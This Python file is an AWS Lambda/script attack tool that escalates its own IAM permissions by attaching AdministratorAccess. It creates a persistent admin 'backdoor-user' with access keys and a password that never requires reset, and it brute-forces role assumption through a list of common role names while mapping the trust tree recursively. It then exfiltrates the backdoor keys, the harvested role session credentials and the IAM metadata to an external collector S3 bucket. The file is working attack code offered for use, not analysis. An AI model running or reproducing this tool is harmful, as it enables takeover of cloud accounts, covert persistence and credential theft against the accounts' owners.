#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
@author: richardw
"""

import boto3
import uuid
import json
import time
import re
import datetime
from botocore.exceptions import BotoCoreError, ClientError
from typing import Dict, List, Optional, Tuple

# for Lambda entry
def lambda_handler(event, context):
    main()
    return {
        'statusCode': 200,
        'body': json.dumps('Finished')
    }

# for Lambda entry
def handler(event, context):
    main()
    return {
        'statusCode': 200,
        'body': json.dumps('Finished')
    }
    

collector_config = {'ARN':'',
            'BUCKET_NAME': '',
            'EXTERNAL_ID': '',
            'OBJECT_KEY': ''
            }
account_id = ""
target_policy_arn = "arn:aws:iam::aws:policy/AdministratorAccess"
backdoor = None
backdoor_user_name = "backdoor-user"
backdoor_password = ""
change_effective_waiting_time = 10

assumecredentials_name = "EscalationAttempt"

common_role_names = (
    "AdminRole",
    "Administrator",
    "DevOpsRole",
    "OrganizationAccountAccessRole",
    "LambdaExecutionRole",
    "Security_Analyst"
    )

def rationalized_naming(name:str) -> str:
    return re.sub(r'[:\s-]', '_', name)

def generate_return_data_name (arn: str):
    account_id =  arn.split(":")[4]
    user_path = arn.split(":")[5].split("/")[1]
    time_str = time.strftime("%Y_%m_%d_%H_%M_%S")
    
    global collector_config
    collector_config['OBJECT_KEY'] = f"{account_id}_{user_path}_{time_str}.json"

def normalize_arn(arn: str) -> str:
    if ":sts::" in arn and ":assumed-role/" in arn:
        parts = arn.split(":")
        account_id = parts[4]
        role_info = parts[5].split("/")
        if len(role_info) >= 2:
            role_name = role_info[1]
            return f"arn:aws:iam::{account_id}:role/{role_name}"
    return arn

def attach_policy(iam, identity_arn):
    success_state = False
    name = identity_arn.split('/')[-1]
    if ":role/" in identity_arn:
        try:
            iam.attach_role_policy(
                RoleName=name,
                PolicyArn=target_policy_arn
            )
            success_state = True
        except Exception as e:
            print(f'[!] Failed to attach policy: {e}')
            return success_state
    else:
        try:
            iam.attach_user_policy(
                UserName=name,
                PolicyArn=target_policy_arn
            )
            success_state = True
        except Exception as e:
            print(f'[!] Failed to attach policy: {e}')
            return success_state
    
    return success_state

def detach_policy(iam, identity_arn):
    success_state = False
    name = identity_arn.split('/')[-1]
    if ":role/" in identity_arn:
        try:
            iam.detach_role_policy(
                RoleName=name,
                PolicyArn=target_policy_arn
            )
            success_state = True
        except Exception as e:
            print(f'[!] Failed to detach policy: {e}')
            return success_state
    else:
        try:
            iam.detach_user_policy(
                UserName=name,
                PolicyArn=target_policy_arn
            )
            success_state = True
        except Exception as e:
            print(f'[!] Failed to detach policy: {e}')
            return success_state

    return success_state

    
    
def create_backdoor_user(iam):
    success_state = False
    
    try:
        iam.create_user(UserName=backdoor_user_name)
        response = iam.create_access_key(UserName=backdoor_user_name)
        iam.attach_user_policy(
            UserName="backdoor-user",
            PolicyArn="arn:aws:iam::aws:policy/AdministratorAccess"
        )
        iam.create_login_profile(
            UserName=backdoor_user_name,
            Password=backdoor_password,
            PasswordResetRequired=False
            )
        success_state = True
        global backdoor
        backdoor = response['AccessKey']
    except Exception as e:
        print(f'[!] Failed to create backdoor: {e}')
        return success_state
        
    return success_state


def create_backdoor(iam):  
    # create a role ?
    
    return create_backdoor_user(iam)


def attemp_assume(current_entity_name, sts, roles_list, assume_tree):
    for role in roles_list:
        if role == current_entity_name:
            continue
        
        target_role_arn = f"arn:aws:iam::{account_id}:role/{role}"
        try: 
            response = sts.assume_role(
                RoleArn = target_role_arn,
                RoleSessionName = assumecredentials_name
                )
            assume_tree.add_assume_relation(current_entity_name, role, response['Credentials'])
            print(f'> try assume role: {target_role_arn} success')
        except:
            print(f'> try assume role: {target_role_arn} failed')
            continue

def exploit(iam, sts, identity_arn, assume_tree, role_recorder):

    # Try to get permissions
    obtainedAdmin_state = attach_policy(iam, identity_arn)
    print(f'> obtained admin {obtainedAdmin_state}')
    
    # If the backdoor role has not been created and permissions have been successfully obtained
    # Try to create backdoor
    if not backdoor and obtainedAdmin_state:
        time.sleep(change_effective_waiting_time)
        create_backdoor_state = create_backdoor(iam)
        print(f'> create backdoor {create_backdoor_state}')

    # List possible roles to be assumed
    # Analyzed from role recoder + Role name explosion dictionary - Already in the Assume tree
    current_entity_name = identity_arn.split('/')[-1]
    trusting_roles = set(role_recorder.find_roles_trusting_principal(current_entity_name, account_id))    
    on_tree_roles = set(assume_tree.get_all_roles())
    possible_assumed_roles = trusting_roles.union(common_role_names) - on_tree_roles 
    print(f'> possible assumed roles {possible_assumed_roles}')
    # Try Assume
    attemp_assume(current_entity_name, sts, possible_assumed_roles, assume_tree )
    
    # Clean up
    if obtainedAdmin_state == True:
        detach_policy_state = detach_policy(iam, identity_arn)
        print(f'> clean up policy {"success" if detach_policy_state else "failed"}')
    
def recycle(sts, data):
    try:
        response = sts.assume_role(
            RoleArn=collector_config['ARN'],
            RoleSessionName= str(uuid.uuid1()),
            ExternalId=collector_config['EXTERNAL_ID']
        )
    except Exception as e:
        print(f'[!] get collector sts failed: {e} ')
        return
    
    creds = response["Credentials"]
    s3_client = boto3.client(
        "s3",
        aws_access_key_id=creds["AccessKeyId"],
        aws_secret_access_key=creds["SecretAccessKey"],
        aws_session_token=creds["SessionToken"]
    )
    
    try:
        s3_client.put_object(
            Bucket=collector_config['BUCKET_NAME'],
            Key=collector_config['OBJECT_KEY'],
            Body=json.dumps(data, default=str)
        )
    except Exception as e:
        print(f'[!] put object to collector failed: {e} ')
        return
    
    print('> Data is successfully transmitted')


class IAMAssumeTree:
    def __init__(self, root_role: str):
        self.root = root_role
        self.nodes: Dict[str, List[str]] = {root_role: []}  # Multi-branch tree structure
        self.edges: Dict[Tuple[str, str], Dict] = {}        # Credentials on the edges

    def add_assume_relation(self, source_role: str, target_role: str, credentials: Optional[Dict] = None) -> bool:
        if source_role not in self.nodes:
            print(f"[!] Cannot add assume relation: source role '{source_role}' not found.")
            return False

        if (source_role, target_role) in self.edges:
            print(f"[!] Assume relation from '{source_role}' to '{target_role}' already exists.")
            return False

        if target_role not in self.nodes:
            self.nodes[target_role] = []

        self.nodes[source_role].append(target_role)
        self.edges[(source_role, target_role)] = credentials or {}

        print(f"[+] Added assume: {source_role} → {target_role}")
        return True

    def get_direct_children(self, role_name: str) -> List[Dict]:
        if role_name not in self.nodes:
            print(f"[!] Role '{role_name}' not found in tree.")
            return []

        result = []
        for child in self.nodes[role_name]:
            cred = self.edges.get((role_name, child), {})
            result.append({
                "role": child,
                "credentials": cred
            })
        return result
    
    def get_all_roles(self) -> List[str]:
        return sorted(self.nodes.keys())

    def get_tree_data(self) -> Dict:
        def build_subtree(role: str, parent: Optional[str] = None) -> Dict:
            credentials = self.edges.get((parent, role), {}) if parent else {}
            return {
                "role": role,
                "credentials": credentials,
                "children": [build_subtree(child, role) for child in self.nodes.get(role, [])]
            }

        if self.root not in self.nodes:
            raise ValueError("Root role is not defined in the tree.")

        return build_subtree(self.root)

    def get_all_paths_to_leaves(self) -> List[str]:
        def dfs(role: str, path: List[str], result: List[str]):
            children = self.nodes.get(role, [])
            new_path = path + [role]

            if not children:
                result.append(" → ".join(new_path))
            else:
                for child in children:
                    dfs(child, new_path, result)

        if self.root not in self.nodes:
            raise ValueError("Root role is not defined in the tree.")

        result = []
        dfs(self.root, [], result)
        return result


class RoleRecorder:
    def __init__(self):
        self.roles = {}  # key: role name, value: full role metadata

    def update_roles(self, iam_client):
        try:
            paginator = iam_client.get_paginator('list_roles')
            for page in paginator.paginate():
                for role in page.get('Roles', []):
                    role_name = role['RoleName']
                    if role_name not in self.roles:
                        self.roles[role_name] = role
        except (BotoCoreError, ClientError) as e:
            print(f"[!] Failed to list IAM roles: {e}")

    def find_roles_trusting_principal(self, principal_arn: str, account_id: str) -> list:
        trusted_roles = set()
        root_arn = f"arn:aws:iam::{account_id}:root"

        for role_name, role_data in self.roles.items():
            policy = role_data.get('AssumeRolePolicyDocument', {})
            statements = policy.get('Statement', [])
            if not isinstance(statements, list):
                statements = [statements]

            for stmt in statements:
                principal = stmt.get('Principal', {})
                aws_field = principal.get('AWS')
                if not aws_field:
                    continue

                principals = [aws_field] if isinstance(aws_field, str) else aws_field

                # Explicitly trusted or trusting all roles
                for val in principals:
                    if principal_arn in val or val == root_arn:
                        trusted_roles.add(role_name)
                        break

        return sorted(trusted_roles)

    def export_to_json(self):
        return json.dumps(
            self.roles,
            indent=2,
            default=lambda obj: obj.isoformat() if isinstance(obj, datetime.datetime) else str(obj)
            )


def recursive(sts, iam, assume_tree, role_recorder):
    # Get current information
    try:
        current_identity_arn = sts.get_caller_identity()['Arn']
    except Exception as e:
        print(f'[!] Faile to get get_caller_identity: {e}')
        
    current_identity_arn = normalize_arn(current_identity_arn)
    print(f'> current identity_arn: {current_identity_arn}')
    
    # Try to get more role information with the current role
    role_recorder.update_roles(iam)
    
    # Exploit the permissions of this role
    exploit(iam, sts, current_identity_arn, assume_tree, role_recorder)
    
    # Enter the next available role
    children = assume_tree.get_direct_children(current_identity_arn.split('/')[-1])
    for child in children:
        role_name = child['role']
        print(f'> get into {role_name}')
        session = boto3.Session(
            aws_access_key_id=child['credentials']['AccessKeyId'],
            aws_secret_access_key=child['credentials']['SecretAccessKey'],
            aws_session_token=child['credentials']['SessionToken']
            )
        recursive(session.client('sts'), session.client('iam'), assume_tree, role_recorder)

    return


def main():
    sts = boto3.client('sts')
    iam = boto3.client('iam')
    try:
        identity = sts.get_caller_identity()
    except:
        print("[!] Failed to get start!")
        return None
    
    global account_id
    account_id = identity['Account']

    identity_arn = normalize_arn(identity['Arn'])
    
    generate_return_data_name(identity_arn)
    
    assume_tree = IAMAssumeTree(identity_arn.split('/')[-1])
    role_recorder = RoleRecorder()
    
    print("> attack start")
    recursive(sts, iam, assume_tree, role_recorder)
    
    tree_data = assume_tree.get_tree_data()
    paths_data = assume_tree.get_all_paths_to_leaves()
    
    
    recycle_data = {'Account ID': account_id,
                    'back door': backdoor,
                    'back door pwd': backdoor_password,
                    'paths': paths_data,
                    'tree_data': tree_data,
                    'role data': role_recorder.roles}
    
    if backdoor:
        time.sleep(change_effective_waiting_time)
        print('> Data is returning through the backdoor user')
        back_door_session = boto3.Session(
            aws_access_key_id=backdoor['AccessKeyId'],
            aws_secret_access_key=backdoor['SecretAccessKey']
            )
        back_door_sts = back_door_session.client('sts')
        try:
            print("[*] get-caller-identity:")
            print(back_door_sts.get_caller_identity())
        except Exception as e:
            print(f"[!] get-caller-identity failed: {e}")
            return
        
        recycle(back_door_sts, recycle_data)
        
    else:
        print('> Data is returning through the Executor')
        recycle(sts, recycle_data)
        
    print("> attack end")
            
        

if __name__ == "__main__":
    main()
    
    
    
    
    
    
    
    
    